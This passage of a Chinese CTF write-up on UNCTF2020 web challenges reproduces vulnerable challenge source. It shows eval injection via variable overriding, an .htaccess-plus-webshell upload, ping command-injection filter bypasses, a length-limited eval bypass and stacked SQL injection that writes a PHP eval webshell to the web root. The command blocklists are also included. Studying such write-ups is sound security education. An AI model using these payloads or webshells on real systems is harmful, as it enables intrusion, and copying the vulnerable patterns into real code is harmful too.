(count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can set config variables!!&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>变量覆盖  sha1弱比较 payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?adminPassword&#x3D;202cb962ac59075b964b07152d234b70&amp;password&#x3D;123&amp;verif&#x3D;0e00000000000000000000081614617300000000</span><br></pre></td></tr></table></figure>
+
+<p>只是对值进行了多虑 可以用键来rce</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?adminPassword&#x3D;202cb962ac59075b964b07152d234b70&amp;password&#x3D;123&amp;verif&#x3D;0e00000000000000000000081614617300000000&amp;GLOBALS[var1;system(&#39;env&#39;);$a]&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>最后eval执行的就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$var1</span>;system(&#x27;env&#x27;);<span class="subst">$a</span>=&#x27;1&#x27;;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其他payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?source&#x3D;1&amp;adminPassword&#x3D;c4ca4238a0b923820dcc509a6f75849b&amp;password&#x3D;1&amp;verif&#x3D;0e1290633704&amp;var1&#x3D;$&#123;$a($b)&#125;&amp;a&#x3D;system&amp;b&#x3D;env</span><br></pre></td></tr></table></figure>
+
+<h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><p>过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl|pyth|ph|auto|curl|base|\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet</span><br></pre></td></tr></table></figure>
+
+<p>上传<code>.htaccess</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .gif</span><br></pre></td></tr></table></figure>
+
+<p>上传马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;&#96;cat &#x2F;*&#96;;</span><br></pre></td></tr></table></figure>
+
+<p>不知道为啥<code>\</code>可以</p>
+<h3 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h3><p>空格过滤用<code>%09</code> </p>
+<p><code>;</code>过滤用<code>||</code></p>
+<p><code>cat</code>过滤用<code>ca\t</code></p>
+<p>flag * 过滤用通配符<code>????</code></p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1||ca\t%09&#x2F;????</span><br></pre></td></tr></table></figure>
+
+<p>看下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    $ip=$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(;|&#x27;| |&gt;|]|&amp;| |\\$|\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i&quot;</span>, $ip))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;strong&gt;&lt;center&gt;非法字符&lt;/center&gt;&lt;/strong&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;strong&gt;&lt;center&gt;非法字符&lt;/center&gt;&lt;/strong&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;欢迎来到UN`s online tools 如果师傅觉得题目不适合您，可以出门左拐&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h3><p>有个提示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(is_file($name)===<span class="literal">false</span>))&#123;flag&#125;<span class="keyword">else</span>&#123;no flag&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;%00</span><br><span class="line">?name[]&#x3D;a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/image-20201116201948388.png" alt="image-20201116201948388"></p>
+<p><code>is_file($name)</code>不能等于flase有两种情况 一种是true 一种是空 后台应该限制了不能是文件 又一个trick</p>
+<h3 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h3><p>查看源代码发现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- B4Z0-@:OCnDf, --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不知道是base85 哭了 解密之后是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/image-20201119132902261.png" alt="image-20201119132902261"></p>
+<p>读源码index.php base64过滤了换rot13 index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($action))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/base|data|input|zip|zlib/i&quot;</span>,$action))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!!!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$action</span>&quot;</span>);</span><br><span class="line">        &#125;                           </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;footer.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">&quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span>	</span><br></pre></td></tr></table></figure>
+
+<p>hint转16进制 1nD3x.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\\\\&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell_exec&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;ob_start&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/m&#x27;</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;WTF???&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sry,try again&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span>	</span><br></pre></td></tr></table></figure>
+
+<p>原理：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>nD3x.php?<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=cat /flag_mdnrvvldb&amp;<span class="number">2</span>=system</span><br><span class="line">POST:	code=usort(...$_GET);</span><br></pre></td></tr></table></figure>
+
+<h3 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h3><p>看到这题立马想到了强网杯随便注 测了测过滤了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use select</span><br></pre></td></tr></table></figure>
+
+<p>查看所有数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">SHOW</span> <span class="keyword">DATABASES</span>;</span><br></pre></td></tr></table></figure>
+
+<p>测了测 发现 set 和 prepare 同时出现时会被过滤 单独出现则不会过滤 按照之前的思路构造写shell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">PREPARE</span> mb <span class="keyword">from</span> <span class="number">0x73656c65637420273132333c3f706870206576616c28245f504f53545b315d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f6d6f6f6e6261636b2e70687027</span>;<span class="keyword">EXECUTE</span> mb;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>或者按照官方的wp</p>
+<p>先创建存储过程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line">    <span class="keyword">create</span> <span class="keyword">procedure</span> <span class="string">`qq`</span>(<span class="keyword">out</span> <span class="keyword">string</span> <span class="built_in">text</span>(<span class="number">1024</span>), <span class="keyword">in</span> <span class="keyword">hex</span> <span class="built_in">text</span>(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">BEGIN</span></span><br><span class="line">        <span class="keyword">SET</span> <span class="keyword">string</span> = <span class="keyword">hex</span>;</span><br><span class="line">    <span class="keyword">END</span>;</span><br><span class="line">    ;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>接着调用先前定义的存储过程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line">    <span class="keyword">call</span> <span class="string">`qq`</span>(@decoded, <span class="number">0x3132333c3f706870206576616c28245f504f53545b315d293b3f3e</span>);</span><br><span class="line">    <span class="keyword">prepare</span> payload <span class="keyword">from</span> @decoded;</span><br><span class="line">    <span class="keyword">execute</span> payload;</span><br><span class="line">    ;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="easy-flask2"><a href="#easy-flask2" class="headerlink" title="easy_flask2"></a>easy_flask2</h3><p>源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,redirect,request,session,make_response</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, is_admin</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.is_admin = is_admin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = config.secret_key</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;login&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/login&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.form.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        person = Person(name,<span class="number">0</span>)</span><br><span class="line">        pkl = pickle.dumps(person)</span><br><span class="line">        pkl = base64.b64encode(pkl)</span><br><span class="line"></span><br><span class="line">        resp = make_response(name)</span><br><span class="line">        resp.set_cookie(<span class="string">&#x27;pkl&#x27;</span>,pkl)</span><br><span class="line"></span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        session[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span>   base64.b64decode(request.cookies[<span class="string">&#x27;pkl&#x27;</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;RCE??&quot;</span></span><br><span class="line">            person = pickle.loads(base64.b64decode(request.cookies[<span class="string">&#x27;pkl&#x27;</span>]))</span><br><span class="line">            print(person.is_admin)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">&#x27;is_admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">                <span class="comment">#person = pickle.loads(base64.b64decode(request.cookies[&#x27;pkl&#x27;]))</span></span><br><span class="line">                <span class="keyword">if</span> person.is_admin == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;HHHacker!Here is Your flag : &quot;</span> + flag</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/logout&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;session&quot;</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;pkl&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/source&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&#x27;code.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>pickle反序列化 过滤了R无法用</p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">p = number.getPrime(<span class="number">1024</span>)</span><br><span class="line">q = number.getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> p &gt; q:</span><br><span class="line">    a = p + q</span><br><span class="line">    b = p - q</span><br><span class="line">    print(a,b)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;msg&#x27;</span>)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168</span></span><br><span class="line"><span class="comment">#9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370</span></span><br><span class="line"><span 